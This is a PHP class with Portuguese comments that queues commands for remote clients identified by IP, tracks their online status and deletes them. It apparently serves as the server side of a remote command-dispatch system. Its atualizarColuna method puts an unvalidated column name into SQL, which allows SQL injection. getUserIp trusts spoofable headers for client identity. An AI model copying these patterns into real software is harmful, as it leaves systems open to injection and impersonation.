<?php

class CommandAPI {
    private $conn;

    public function __construct($conn) {
        $this->conn = $conn;
        date_default_timezone_set('America/Sao_Paulo');  // Definindo o fuso horário para Brasília
    }

    public function fetchCommand($ip) {
        $stmt = $this->conn->prepare('SELECT id, comando FROM comandos WHERE cliente_id = (SELECT id FROM clientes WHERE ip = :ip) AND status = "enviado" ORDER BY criado_em ASC LIMIT 1');
        $stmt->execute(['ip' => $ip]);

        if ($stmt->rowCount() > 0) {
            $comando = $stmt->fetch(PDO::FETCH_ASSOC);
            $comando_id = $comando['id'];
            $stmt = $this->conn->prepare('UPDATE comandos SET status = "recebido" WHERE id = :id');
            $stmt->execute(['id' => $comando_id]);
            return ['status' => 'success', 'comando' => $comando['comando'], 'comando_id' => $comando['id']];
        } else {
            return ['status' => 'no_command'];
        }
    }

    public function updateStatus($comando_id, $status) {
        $stmt = $this->conn->prepare('UPDATE comandos SET status = :status WHERE id = :id');
        $stmt->execute(['status' => $status, 'id' => $comando_id]);
        return ['status' => 'success'];
    }

    public function consultarClientesOnline() {
        $stmt = $this->conn->prepare('SELECT * FROM clientes WHERE status = "ativo"');
        $stmt->execute();
        $clientes = $stmt->fetchAll(PDO::FETCH_ASSOC);

        $clientes_com_status = [];
        $threshold = new DateTime('-3 seconds', new DateTimeZone('America/Sao_Paulo'));
        $useronline = [];
        foreach ($clientes as $cliente) {
            $ultimo_ativo = new DateTime($cliente['ultimo_ativo'], new DateTimeZone('America/Sao_Paulo'));
            $status = ($ultimo_ativo > $threshold) ? 'online' : 'offline';

            if($ultimo_ativo > $threshold){
                $useronline[] = $cliente;
            }


            $cliente['status'] = $status;
            
            $clientes_com_status[] = $cliente;
        }

        return ['status' => 'success', 'count_clientes' => count($clientes), 'count_onlines' => count($useronline), 'clientes' => $clientes_com_status];
    }


    public function enviarComando($cliente_id, $comando) {
        $stmt = $this->conn->prepare('INSERT INTO comandos (cliente_id, comando) VALUES (:cliente_id, :comando)');
        $stmt->execute(['cliente_id' => $cliente_id, 'comando' => $comando]);
        return ['status' => 'success'];
    }

    public function registrarOuAtualizarCliente($ip) {
        $stmt = $this->conn->prepare('SELECT id FROM clientes WHERE ip = :ip');
        $stmt->execute(['ip' => $ip]);

        if ($stmt->rowCount() > 0) {
            $cliente = $stmt->fetch(PDO::FETCH_ASSOC);
            $cliente_id = $cliente['id'];
            $timestamp = time(); // ou qualquer outro timestamp Unix
            $data_formatada = date('Y-m-d H:i:s', $timestamp);
            $stmt = $this->conn->prepare('UPDATE clientes SET ultimo_ativo = :data WHERE id = :id');
            $stmt->execute(['data' => $data_formatada, 'id' => $cliente_id]);
        } else {
            $stmt = $this->conn->prepare('INSERT INTO clientes (ip) VALUES (:ip)');
            $stmt->execute(['ip' => $ip]);
            $cliente_id = $this->conn->lastInsertId();
        }

        return $cliente_id;
    }

    public function isStatus($ip) {
        $stmt = $this->conn->prepare('SELECT status FROM clientes WHERE ip = :ip');
        $stmt->execute(['ip' => $ip]);

        if ($stmt->rowCount() > 0) {
            $cliente = $stmt->fetch(PDO::FETCH_ASSOC);
            $status = $cliente['status'];
        } else {
            $status = 'ativo';
        }

        return $status;
    }

    public function atualizarColuna($cliente_id, $coluna, $valor) {
        // Verificar se a coluna existe na tabela `clientes`
        $result = $this->conn->query("SHOW COLUMNS FROM clientes LIKE '$coluna'");
        if ($result->rowCount() == 0) {
            return ['status' => 'error', 'message' => 'Coluna não existe'];
        }

        // Preparar a declaração de atualização
        $stmt = $this->conn->prepare("UPDATE clientes SET $coluna = :valor WHERE id = :id");
        $stmt->bindValue(':valor', $valor, PDO::PARAM_STR);
        $stmt->bindValue(':id', $cliente_id, PDO::PARAM_INT);

        // Executar a declaração
        if ($stmt->execute()) {
            return ['status' => 'success', 'message' => 'Coluna atualizada com sucesso'];
        } else {
            return ['status' => 'error', 'message' => 'Erro ao atualizar a coluna'];
        }
    }
    
    public function deleteips($ip) {
        
        $stmt = $this->conn->prepare(' DELETE FROM comandos WHERE cliente_id = (SELECT id FROM clientes WHERE ip = :ip)');
        $stmt->execute(['ip' => $ip]);
        
        $stmt = $this->conn->prepare('DELETE FROM clientes WHERE ip = :ip');
        $stmt->execute(['ip' => $ip]);
        
        return true;
    }

    public function getUserIp(){
        if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
            $ip = $_SERVER['HTTP_CLIENT_IP'];
        } elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
            $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
        } else {
            $ip = $_SERVER['REMOTE_ADDR'];
        }

        return $ip;
    }

    // Outros métodos da API podem ser adicionados aqui
}

